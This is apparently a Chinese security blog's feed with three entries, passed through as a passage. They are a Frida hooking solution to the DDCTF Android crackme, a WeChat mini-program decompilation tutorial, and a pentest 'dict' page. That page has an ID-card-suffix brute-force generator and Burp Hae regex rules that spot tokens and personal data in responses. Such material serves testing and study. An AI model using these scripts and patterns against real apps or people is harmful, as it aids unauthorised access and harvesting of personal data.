<p>我们getDeclaredConstructor()得到了构造函数Constructor，我们现在要将它实例化，再来看看MainActivityPatch的构造函数，传递一个object对象，并将它强制转换成MainActivity类型。<br>那我们实例化的参数就是MainActivity对象了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class MainActivityPatch &#123;</span><br><span class="line">    MainActivity originClass;</span><br><span class="line">    &#x2F;&#x2F;构造函数</span><br><span class="line">    public MainActivityPatch(Object obj) &#123;</span><br><span class="line">        this.originClass &#x3D; (MainActivity) obj;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Java.perform(function()&#123;</span><br><span class="line">        var hookClass &#x3D; undefined;</span><br><span class="line">        var ClassUse &#x3D; Java.use(&quot;java.lang.Class&quot;);</span><br><span class="line">        var objectclass&#x3D; Java.use(&quot;java.lang.Object&quot;);</span><br><span class="line">        var dexclassLoader &#x3D; Java.use(&quot;dalvik.system.DexClassLoader&quot;);</span><br><span class="line">        var orininclass &#x3D; Java.use(&quot;cn.chaitin.geektan.crackme.MainActivity&quot;);</span><br><span class="line">        var Integerclass &#x3D; Java.use(&quot;java.lang.Integer&quot;);</span><br><span class="line">        &#x2F;&#x2F;实例化MainActivity对象</span><br><span class="line">        var mainAc &#x3D; orininclass.$new();</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        dexclassLoader.loadClass.overload(&#39;java.lang.String&#39;).implementation &#x3D; function(name)&#123;</span><br><span class="line">            var hookname &#x3D; &quot;cn.chaitin.geektan.crackme.MainActivityPatch&quot;;</span><br><span class="line">            var result &#x3D; this.loadClass(name,false);</span><br><span class="line"> </span><br><span class="line">            if(name &#x3D;&#x3D; hookname)&#123;</span><br><span class="line">                var hookClass &#x3D; result;</span><br><span class="line">                var hookClassCast &#x3D; Java.cast(hookClass,ClassUse);</span><br><span class="line">                console.log(&quot;-----------------------------BEGIN-------------------------------------&quot;);</span><br><span class="line">                &#x2F;&#x2F;获取构造器</span><br><span class="line">                var ConstructorParam &#x3D;Java.array(&#39;Ljava.lang.Object;&#39;,[objectclass.class]);</span><br><span class="line">                var Constructor &#x3D; hookClassCast.getDeclaredConstructor(ConstructorParam);</span><br><span class="line">                console.log(&quot;Constructor:&quot;+Constructor);</span><br><span class="line">                console.log(&quot;orinin:&quot;+mainAc);</span><br><span class="line">                &#x2F;&#x2F;实例化，newInstance的参数也是Ljava.lang.Object;</span><br><span class="line">                var instance &#x3D; Constructor.newInstance([mainAc]);</span><br><span class="line">                console.log(&quot;patchAc:&quot;+instance);</span><br><span class="line">                send(instance);</span><br><span class="line">console.log(&quot;--------------------------------------------------------------------&quot;);</span><br><span class="line">                return result;</span><br><span class="line"> </span><br><span class="line">            &#125;</span><br><span class="line">            return result;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>执行结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Constructor:public cn.chaitin.geektan.crackme.MainActivityPatch(java.lang.Object)</span><br><span class="line">orinin:cn.chaitin.geektan.crackme.MainActivity@4a3e446</span><br><span class="line">patchAc:cn.chaitin.geektan.crackme.MainActivityPatch@d79b607</span><br><span class="line">message: &#123;&#39;type&#39;: &#39;send&#39;, &#39;payload&#39;: &#39;&lt;instance: java.lang.Object, $className: cn.chaitin.geektan.crackme.MainActivityPatch&gt;&#39;&#125; data: None</span><br></pre></td></tr></table></figure>

<p>2.我们得到了实例化的类后，第二步就是利用getDeclaredMethods()，获取本类中的所有方法，包括私有的(private、protected、默认以及public)的方法，并通过数组下标的方式获取我们想要的方法。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public Method[] getDeclaredMethods() throws SecurityException &#123;</span><br><span class="line">       Method[] result &#x3D; getDeclaredMethodsUnchecked(false);</span><br><span class="line">       for (Method m : result) &#123;</span><br><span class="line">           &#x2F;&#x2F; Throw NoClassDefFoundError if types cannot be resolved.</span><br><span class="line">           m.getReturnType();</span><br><span class="line">           m.getParameterTypes();</span><br><span class="line">       &#125;</span><br><span class="line">       return result;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>从getDeclareMethods()，我们知道它返回的是一个Method数组</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var func &#x3D; hookClassCast.getDeclaredMethods();</span><br><span class="line">console.log(func);</span><br><span class="line">&#x2F;&#x2F;直接通过下标获取我们要调用的方法</span><br><span class="line">console.log(func[0]);</span><br></pre></td></tr></table></figure>

<p>看看一个完整的示例，和上面的一样，仅仅调用了getDeclaredMethods()方法。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Java.perform(function()&#123;</span><br><span class="line">        var hookClass &#x3D; undefined;</span><br><span class="line">        var ClassUse &#x3D; Java.use(&quot;java.lang.Class&quot;);</span><br><span class="line">        var objectclass&#x3D; Java.use(&quot;java.lang.Object&quot;);</span><br><span class="line">        var dexclassLoader &#x3D; Java.use(&quot;dalvik.system.DexClassLoader&quot;);</span><br><span class="line">        var orininclass &#x3D; Java.use(&quot;cn.chaitin.geektan.crackme.MainActivity&quot;);</span><br><span class="line">        var Integerclass &#x3D; Java.use(&quot;java.lang.Integer&quot;);</span><br><span class="line">        &#x2F;&#x2F;实例化MainActivity对象</span><br><span class="line">        var mainAc &#x3D; orininclass.$new();</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        dexclassLoader.loadClass.overload(&#39;java.lang.String&#39;).implementation &#x3D; function(name)&#123;</span><br><span class="line">            var hookname &#x3D; &quot;cn.chaitin.geektan.crackme.MainActivityPatch&quot;;</span><br><span class="line">            var result &#x3D; this.loadClass(name,false);</span><br><span class="line"> </span><br><span class="line">            if(name &#x3D;&#x3D; hookname)&#123;</span><br><span class="line">                var hookClass &#x3D; result;</span><br><span class="line">                var hookClassCast &#x3D; Java.cast(hookClass,ClassUse);</span><br><span class="line">                console.log(&quot;-----------------------------BEGIN-------------------------------------&quot;);</span><br><span class="line">                &#x2F;&#x2F;获取构造器</span><br><span class="line">                var ConstructorParam &#x3D;Java.array(&#39;Ljava.lang.Object;&#39;,[objectclass.class]);</span><br><span class="line">                var Constructor &#x3D; hookClassCast.getDeclaredConstructor(ConstructorParam);</span><br><span class="line">                console.log(&quot;Constructor:&quot;+Constructor);</span><br><span class="line">                console.log(&quot;orinin:&quot;+mainAc);</span><br><span class="line">                &#x2F;&#x2F;实例化，newInstance的参数也是Ljava.lang.Object;</span><br><span class="line">                var instance &#x3D; Constructor.newInstance([mainAc]);</span><br><span class="line">                console.log(&quot;MainActivityPatchInstance:&quot;+instance);</span><br><span class="line">                send(instance);</span><br><span class="line">                console.log(&quot;----------------------------Methods---------------------------------&quot;);</span><br><span class="line">                var func &#x3D; hookClassCast.getDeclaredMethods();</span><br><span class="line">                console.log(func);</span><br><span class="line">                console.log(&quot;--------------------------Need Method---------------------------------&quot;);</span><br><span class="line">                console.log(func[0]);</span><br><span class="line">                var f &#x3D; func[0];</span><br><span class="line">                console.log(&quot;---------------------------- OVER---------------------------------&quot;);</span><br><span class="line">                return result;</span><br><span class="line"> </span><br><span class="line">            &#125;</span><br><span class="line">            return result;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>执行结果：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211221163603106.png" alt="image-20211221163603106"></p>
<p>3.接下来就是调用Method.invoke()去执行对应的方法了，invoke方法的第一个参数是执行这个方法的对象实例，第二个参数是带入的实际值数组，返回值是Object，也既是该方法执行后的返回值。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public native Object invoke(Object obj, Object... args)</span><br><span class="line">           throws IllegalAccessException, IllegalArgumentException, InvocationTargetException;</span><br></pre></td></tr></table></figure>

<p>那现在就有一个问题，第二个值是一个数据，我们需要带入实际值的数组，那这么来构造数组呢，很简单刚刚我们已经学习了Frida 中Java.array的用法。现在我们就来构造2个实际值的Integer数组。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var Integerclass &#x3D; Java.use(&quot;java.lang.Integer&quot;);</span><br><span class="line">var num1 &#x3D; Integerclass.$new(5);</span><br><span class="line">var num2 &#x3D; Integerclass.$new(6);</span><br><span class="line">var numArr1 &#x3D; Java.array(&#39;Ljava.lang.Object;&#39;,[num1,num2]);</span><br><span class="line">var num3 &#x3D; Integerclass.$new(7);</span><br><span class="line">var num4 &#x3D; Integerclass.$new(8);</span><br><span class="line">var numArr2 &#x3D; Java.array(&#39;Ljava.lang.Object;&#39;,[num3,num4]);</span><br></pre></td></tr></table></figure>

<p>接下来我们就可以愉快的调用Joseph方法了。</p>
<h2 id="最终代码"><a href="#最终代码" class="headerlink" title="最终代码"></a>最终代码</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Java.perform(function()&#123;</span><br><span class="line">        var hookClass &#x3D; undefined;</span><br><span class="line">        var ClassUse &#x3D; Java.use(&quot;java.lang.Class&quot;);</span><br><span class="line">        var objectclass&#x3D; Java.use(&quot;java.lang.Object&quot;);</span><br><span class="line">        var dexclassLoader &#x3D; Java.use(&quot;dalvik.system.DexClassLoader&quot;);</span><br><span class="line">        var orininclass &#x3D; Java.use(&quot;cn.chaitin.geektan.crackme.MainActivity&quot;);</span><br><span class="line">        var Integerclass &#x3D; Java.use(&quot;java.lang.Integer&quot;);</span><br><span class="line">        var mainAc &#x3D; orininclass.$new();</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        dexclassLoader.loadClass.overload(&#39;java.lang.String&#39;).implementation &#x3D; function(name)&#123;</span><br><span class="line">            var hookname &#x3D; &quot;cn.chaitin.geektan.crackme.MainActivityPatch&quot;;</span><br><span class="line">            var result &#x3D; this.loadClass(name,false);</span><br><span class="line">            if(name &#x3D;&#x3D; hookname)&#123;</span><br><span class="line">                var hookClass &#x3D; result;</span><br><span class="line">                var hookClassCast &#x3D; Java.cast(hookClass,ClassUse);</span><br><span class="line">                console.log(&quot;-----------------------------GET Constructor-------------------------------------&quot;);</span><br><span class="line">                var ConstructorParam &#x3D;Java.array(&#39;Ljava.lang.Object;&#39;,[objectclass.class]);</span><br><span class="line">                var Constructor &#x3D; hookClassCast.getDeclaredConstructor(ConstructorParam);</span><br><span class="line">                console.log(&quot;Constructor:&quot;+Constructor);</span><br><span class="line">                console.log(&quot;orinin:&quot;+mainAc);</span><br><span class="line">                var instance &#x3D; Constructor.newInstance([mainAc]);</span><br><span class="line">                console.log(&quot;patchAc:&quot;+instance);</span><br><span class="line">                send(instance);</span><br><span class="line"> </span><br><span class="line">                console.log(&quot;-----------------------------GET Methods----------------------------&quot;);</span><br><span class="line">                var func &#x3D; hookClassCast.getDeclaredMethods();</span><br><span class="line">                console.log(func);</span><br><span class="line">                console.log(&quot;--------------------------GET Joseph Function---------------------------&quot;);</span><br><span class="line">                console.log(func[0]);</span><br><span class="line">                var f &#x3D; func[0];</span><br><span class="line">                var num1 &#x3D; Integerclass.$new(5);</span><br><span class="line">                var num2 &#x3D; Integerclass.$new(6);</span><br><span class="line">                var numArr1 &#x3D; Java.array(&#39;Ljava.lang.Object;&#39;,[num1,num2]);</span><br><span class="line">                var num3 &#x3D; Integerclass.$new(7);</span><br><span class="line">                var num4 &#x3D; Integerclass.$new(8);</span><br><span class="line">                var numArr2 &#x3D; Java.array(&#39;Ljava.lang.Object;&#39;,[num3,num4]);</span><br><span class="line">                console.log(&quot;-----------------------------GET Array------------------------------&quot;);</span><br><span class="line">                console.log(numArr1);</span><br><span class="line">                console.log(numArr2);</span><br><span class="line">                var rtn1 &#x3D; f.invoke(instance,numArr1);</span><br><span class="line">                var rtn2 &#x3D; f.invoke(instance,numArr2);</span><br><span class="line">                console.log(&quot;--------------------------------FLAG---------------------------------&quot;);</span><br><span class="line">                console.log(&quot;DDCTF&#123;&quot;+rtn1+rtn2+&quot;&#125;&quot;);</span><br><span class="line">                console.log(&quot;--------------------------------OVER--------------------------------&quot;);</span><br><span class="line">                return result;</span><br><span class="line"> </span><br><span class="line">            &#125;</span><br><span class="line">            return result;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>得到最终答案：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211221182844509.png" alt="image-20211221182844509"></p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://bbs.pediy.com/thread-229657.htm">https://bbs.pediy.com/thread-229657.htm</a></p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Frida</tag>
        <tag>Hook</tag>
      </tags>
  </entry>
  <entry>
    <title>微信小程序反编译</title>
    <url>/2021/09/13/WEB/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91/</url>
    <content><![CDATA[<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mac os 11.2.2</span><br><span class="line">网易MUMU模拟器</span><br><span class="line">APP文件管理器</span><br><span class="line">微信开发者工具:Stable Build (1.05.2108130)</span><br></pre></td></tr></table></figure>



<h1 id="获取小程序包"><a href="#获取小程序包" class="headerlink" title="获取小程序包"></a>获取小程序包</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.使用自己手机上的微信打开对应的小程序,可以添加到&quot;我的小程序&quot;</span><br><span class="line">2.打开模拟器的微信并登录</span><br><span class="line">3.在模拟器微信的下拉小程序最近使用历史中打开&quot;你所选的小程序&quot;,如果历史记录中没有就在我的小程序中找一找</span><br><span class="line">4.打开小程序等待加载之后就可以去找源码包了</span><br><span class="line">5.打开对应的文件管理器,进入到以下路径查找源码包(可以根据下载时间区分出你想要的源码包)</span><br><span class="line">6.拷贝到mumu浏览器共享目录</span><br></pre></td></tr></table></figure>

<p>小程序存放路径如下：/data/data/com.tencent.mm/MicroMsg/…/appbrand/pkg/</p>
<p>…部分根据时间戳或者单点击一个小程序在进行测试，大部分为03075c115f972899a1b1b8cc70506599这种</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210913181136982.png" alt="image-20210913181136982"></p>
<a id="more"></a>

<h1 id="反编译小程序"><a href="#反编译小程序" class="headerlink" title="反编译小程序"></a>反编译小程序</h1><p>地址：<a href="https://github.com/xuedingmiaojun/wxappUnpacker">https://github.com/xuedingmiaojun/wxappUnpacker</a></p>
<p>下载后在目录下安装如下依赖：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install esprima</span><br><span class="line">    </span><br><span class="line">npm install css-tree</span><br><span class="line">    </span><br><span class="line">npm install cssbeautify</span><br><span class="line">    </span><br><span class="line">npm install vm2</span><br><span class="line">    </span><br><span class="line">npm install uglify-es</span><br><span class="line">    </span><br><span class="line">npm install js-beautify</span><br></pre></td></tr></table></figure>

<p>使用命令<code>node wuWxapkg.js path_wxapkg</code>进行反编译输出信息如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ node wuWxapkg.js _1900266061_26.wxapkg</span><br><span class="line">Unpack file _1900266061_26.wxapkg...</span><br><span class="line"></span><br><span class="line">Header info:</span><br><span class="line">  firstMark: 0xbe</span><br><span class="line">  unknownInfo:  0</span><br><span class="line">  infoListLength:  1305</span><br><span class="line">  dataLength:  291959</span><br><span class="line">  lastMark: 0xed</span><br><span class="line"></span><br><span class="line">File list info:</span><br><span class="line">  fileCount:  38</span><br><span class="line">Saving files...</span><br><span class="line">Unpack done.</span><br><span class="line">Split app-service.js and make up configs &amp; wxss &amp; wxml &amp; wxs...</span><br><span class="line">deal config ok</span><br><span class="line">deal js ok</span><br><span class="line">deal html ok</span><br><span class="line">deal css ok</span><br><span class="line">Decompile .&#x2F;Componet&#x2F;circle&#x2F;circle.wxml...</span><br><span class="line">Decompile success!</span><br><span class="line">Decompile .&#x2F;Componet&#x2F;wave&#x2F;wave.wxml...</span><br><span class="line">Decompile success!</span><br><span class="line">Decompile .&#x2F;Componet&#x2F;wx-pulltorefresh-view&#x2F;wx-pulltorefresh-view.wxml...</span><br><span class="line">Decompile success!</span><br><span class="line">Decompile .&#x2F;pages&#x2F;date&#x2F;date.wxml...</span><br><span class="line">Decompile success!</span><br><span class="line">Decompile .&#x2F;pages&#x2F;exam&#x2F;exam.wxml...</span><br><span class="line">Decompile success!</span><br><span class="line">Decompile .&#x2F;pages&#x2F;freeclass&#x2F;freeclass.wxml...</span><br><span class="line">Decompile success!</span><br><span class="line">Decompile .&#x2F;pages&#x2F;grade&#x2F;grade.wxml...</span><br><span class="line">Decompile success!</span><br><span class="line">Decompile .&#x2F;pages&#x2F;index&#x2F;index.wxml...</span><br><span class="line">Decompile success!</span><br><span class="line">Decompile .&#x2F;pages&#x2F;index&#x2F;passwd&#x2F;passwd.wxml...</span><br><span class="line">Decompile success!</span><br><span class="line">Decompile .&#x2F;pages&#x2F;jxpg&#x2F;each.wxml...</span><br><span class="line">Decompile success!</span><br><span class="line">Decompile .&#x2F;pages&#x2F;jxpg&#x2F;jxpg.wxml...</span><br><span class="line">Decompile success!</span><br><span class="line">Decompile .&#x2F;pages&#x2F;level&#x2F;level.wxml...</span><br><span class="line">Decompile success!</span><br><span class="line">Decompile .&#x2F;pages&#x2F;timetable&#x2F;my-modal&#x2F;my-modal.wxml...</span><br><span class="line">Decompile success!</span><br><span class="line">Decompile .&#x2F;pages&#x2F;timetable&#x2F;timetable.wxml...</span><br><span class="line">Decompile success!</span><br><span class="line">splitJs: &#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26&#x2F;app-service.js</span><br><span class="line">&#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26 utils&#x2F;httputils.js</span><br><span class="line">&#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26 utils&#x2F;util.js</span><br><span class="line">&#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26 app.js</span><br><span class="line">&#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26 Componet&#x2F;circle&#x2F;circle.js</span><br><span class="line">&#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26 Componet&#x2F;wave&#x2F;wave.js</span><br><span class="line">&#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26 Componet&#x2F;wx-pulltorefresh-view&#x2F;wx-pulltorefresh-view.js</span><br><span class="line">&#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26 pages&#x2F;index&#x2F;passwd&#x2F;passwd.js</span><br><span class="line">&#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26 pages&#x2F;timetable&#x2F;my-modal&#x2F;my-modal.js</span><br><span class="line">&#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26 pages&#x2F;index&#x2F;index.js</span><br><span class="line">&#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26 pages&#x2F;grade&#x2F;grade.js</span><br><span class="line">&#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26 pages&#x2F;level&#x2F;level.js</span><br><span class="line">&#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26 pages&#x2F;timetable&#x2F;timetable.js</span><br><span class="line">&#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26 pages&#x2F;freeclass&#x2F;freeclass.js</span><br><span class="line">&#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26 pages&#x2F;date&#x2F;date.js</span><br><span class="line">&#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26 pages&#x2F;exam&#x2F;exam.js</span><br><span class="line">&#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26 pages&#x2F;jxpg&#x2F;jxpg.js</span><br><span class="line">&#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26 pages&#x2F;jxpg&#x2F;each.js</span><br><span class="line">Splitting &quot;&#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26&#x2F;app-service.js&quot; done.</span><br><span class="line">Guess wxss(first turn)...</span><br><span class="line">Import count info: &#123;&#125;</span><br><span class="line">Guess wxss(first turn) done.</span><br><span class="line">Generate wxss(second turn)...</span><br><span class="line">Generate wxss(second turn) done.</span><br><span class="line">Save wxss...</span><br><span class="line">saveDir: &#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26</span><br><span class="line">Split and make up done.</span><br><span class="line">Delete files...</span><br><span class="line">Deleted.</span><br><span class="line"></span><br><span class="line">File done.</span><br><span class="line">Total use: 643.682ms</span><br></pre></td></tr></table></figure>

<h1 id="工具用法"><a href="#工具用法" class="headerlink" title="工具用法"></a>工具用法</h1><ul>
<li><code>node wuConfig.js &lt;files...&gt;</code> 将 app-config.json 中的内容拆分到各个文件对应的 .json 和 app.json , 并通过搜索 app-config.json 所在文件夹下的所有文件尝试将 iconData 还原为 iconPath 。</li>
<li><code>node wuJs.js &lt;files...&gt;</code> 将 app-service.js (或小游戏中的 game.js ) 拆分成一系列原先独立的 javascript 文件，并使用 Uglify-ES 美化，从而尽可能还原编译前的情况。</li>
<li><code>node wuWxml.js [-m] &lt;files...&gt;</code> 将编译/混合到 page-frame.html ( 或 app-wxss.js ) 中的 wxml 和 wxs 文件还原为独立的、未编译的文件。如果加上<code>-m</code>指令，就会阻止<code>block</code>块自动省略，可能帮助解决一些相关过程的 bug 。</li>
<li><code>node wuWxss.js &lt;dirs...&gt;</code> 通过获取文件夹下的 page-frame.html ( 或 app-wxss.js ) 和其他 html 文件的内容，还原出编译前 wxss 文件的内容。</li>
<li><code>node wuWxapkg.js [-o] [-d] [-s=&lt;Main Dir&gt;] &lt;files...&gt;</code> 将 wxapkg 文件解包，并将包中上述命令中所提的被编译/混合的文件自动地恢复原状。如果加上<code>-o</code>指令，表示仅解包，不做后续操作。如果加上<code>-d</code>指令，就会保留编译/混合后所生成的新文件，否则会自动删去这些文件。同时，前面命令中的指令也可直接加在这一命令上。</li>
</ul>
<p>ps：<strong>如果想单独执行config、js、wxml、wxss的反编译可以在解包时加-o参数不做后续操作</strong></p>
<h1 id="导入开发者工具或者打开编辑器进行查看"><a href="#导入开发者工具或者打开编辑器进行查看" class="headerlink" title="导入开发者工具或者打开编辑器进行查看"></a>导入开发者工具或者打开编辑器进行查看</h1><p>打开微信开发者工具,导入项目即可，对应id申请测试就可以</p>
<ul>
<li>注意勾选不校验合法域名</li>
<li>勾掉e6转es5(这个小程序貌似并没有使用es6语法)</li>
</ul>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210913184148585.png" alt="image-20210913184148585"></p>
<p>解包其它小程序可能项目配置略有不同。</p>
<h1 id="图形化操作"><a href="#图形化操作" class="headerlink" title="图形化操作"></a>图形化操作</h1><p>下载<a href="https://github.com/xuedingmiaojun/wxappUnpacker#自助解包客户端">https://github.com/xuedingmiaojun/wxappUnpacker#自助解包客户端</a></p>
<p>根据自己的版本进行下载安装</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210913184505518.png" alt="image-20210913184505518"></p>
<p>打开后直接上传对应的wxapkg文件即可</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210913184547303.png" alt="image-20210913184547303"></p>
<p>可以查看安全日志，并导出压缩包</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210913184618552.png" alt="image-20210913184618552"></p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://github.com/xuedingmiaojun/wxappUnpacker">https://github.com/xuedingmiaojun/wxappUnpacker</a></p>
<p><a href="https://github.com/wetools/wept">https://github.com/wetools/wept</a></p>
<p><a href="https://github.com/xuedingmiaojun/wxappUnpacker#自助解包客户端">https://github.com/xuedingmiaojun/wxappUnpacker#自助解包客户端</a></p>
<p><a href="http://xuedingmiao.com/blog/xcx_unpack.html">http://xuedingmiao.com/blog/xcx_unpack.html</a></p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>小程序</tag>
      </tags>
  </entry>
  <entry>
    <title>常用Dict使用集合</title>
    <url>/2021/09/26/WEB/%E5%B8%B8%E7%94%A8Dict%E4%BD%BF%E7%94%A8%E9%9B%86%E5%90%88/</url>
    <content><![CDATA[<p>身份证后六位：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import itertools</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    date &#x3D; input(&quot;出生日期: &quot;)</span><br><span class="line">    sex &#x3D; &#39;02468&#39; if int(input(&quot;性别(男1女2): &quot;)) % 2 &#x3D;&#x3D; 0 else &#39;13579&#39;  # 性别位</span><br><span class="line">    check &#x3D; &#39;0123456789X&#39;  # 校验位</span><br><span class="line">    other &#x3D; &#39;0123456789&#39;   # 其它位</span><br><span class="line">    nums &#x3D; itertools.product(other, other, sex, check)</span><br><span class="line">    cards &#x3D; []</span><br><span class="line">    for num in nums:</span><br><span class="line">        card &#x3D; date + &quot;&quot;.join(num)</span><br><span class="line">        cards.append(card)</span><br><span class="line">    print(len(cards))</span><br><span class="line">    print(cards)</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<p>Hae:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hae</span><br><span class="line"></span><br><span class="line">rules:</span><br><span class="line">- rule:</span><br><span class="line">  - color: green</span><br><span class="line">    engine: dfa</span><br><span class="line">    loaded: true</span><br><span class="line">    name: Shiro</span><br><span class="line">    regex: (&#x3D;deleteMe|rememberMe&#x3D;)</span><br><span class="line">    scope: any</span><br><span class="line">    </span><br><span class="line">  - color: green</span><br><span class="line">    engine: dfa</span><br><span class="line">    loaded: true</span><br><span class="line">    name: JSON Web Token</span><br><span class="line">    regex: (ey[A-Za-z0-9_-]&#123;10,&#125;\.[A-Za-z0-9._-]&#123;10,&#125;|ey[A-Za-z0-9_\&#x2F;+-]&#123;10,&#125;\.[A-Za-z0-9._\&#x2F;+-]&#123;10,&#125;)</span><br><span class="line">    scope: any</span><br><span class="line">    </span><br><span class="line">  - color: green</span><br><span class="line">    engine: dfa</span><br><span class="line">    loaded: true</span><br><span class="line">    name: Swagger UI</span><br><span class="line">    regex: ((swagger-ui.html)|(\&quot;swagger\&quot;:)|(Swagger UI)|(swaggerUi))</span><br><span class="line">    scope: response</span><br><span class="line">    </span><br><span class="line">  type: Fingerprint</span><br><span class="line">- rule:</span><br><span class="line">  - color: yellow</span><br><span class="line">    engine: nfa</span><br><span class="line">    loaded: true</span><br><span class="line">    name: Email</span><br><span class="line">    regex: (([a-zA-Z0-9][_|\.])*[a-zA-Z0-9]+@([a-zA-Z0-9][-|_|\.])*[a-zA-Z0-9]+\.((?!js|css|jpg|jpeg|png|ico)[a-zA-Z]&#123;2,&#125;))</span><br><span class="line">    scope: response body</span><br><span class="line"></span><br><span class="line">- color: orange</span><br><span class="line">    engine: nfa</span><br><span class="line">    loaded: true</span><br><span class="line">    name: Chinese IDCard</span><br><span class="line">    regex: [^0-9]((\d&#123;8&#125;(0\d|10|11|12)([0-2]\d|30|31)\d&#123;3&#125;$)|(\d&#123;6&#125;(18|19|20)\d&#123;2&#125;(0[1-9]|10|11|12)([0-2]\d|30|31)\d&#123;3&#125;(\d|X|x)))[^0-9]</span><br><span class="line">    scope: response body</span><br><span class="line"></span><br><span class="line">- color: orange</span><br><span class="line">    engine: nfa</span><br><span class="line">    loaded: true</span><br><span class="line">    name: Chinese Mobile Number</span><br><span class="line">    regex: [^0-9A-Za-z](1(3([0-35-9]\d|4[1-8])|4[14-9]\d|5([\d]\d|7[1-79])|66\d|7[2-35-8]\d|8\d&#123;2&#125;|9[89]\d)\d&#123;7&#125;)[^0-9A-Za-z]</span><br><span class="line">    scope: response body</span><br><span class="line"></span><br><span class="line">- color: cyan</span><br><span class="line">    engine: nfa</span><br><span class="line">    loaded: true</span><br><span class="line">    name: Internal IP Address</span><br><span class="line">    regex: [^0-9]((127\.0\.0\.1)|(localhost)|(10\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;)|(172\.((1[6-9])|(2\d)|(3[01]))\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;)|(192\.168\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;))</span><br><span class="line">    scope: response</span><br><span class="line"> </span><br><span class="line"> - color: green</span><br><span class="line">    engine: nfa</span><br><span class="line">    loaded: true</span><br><span class="line">    name: MAC Address</span><br><span class="line">    regex: 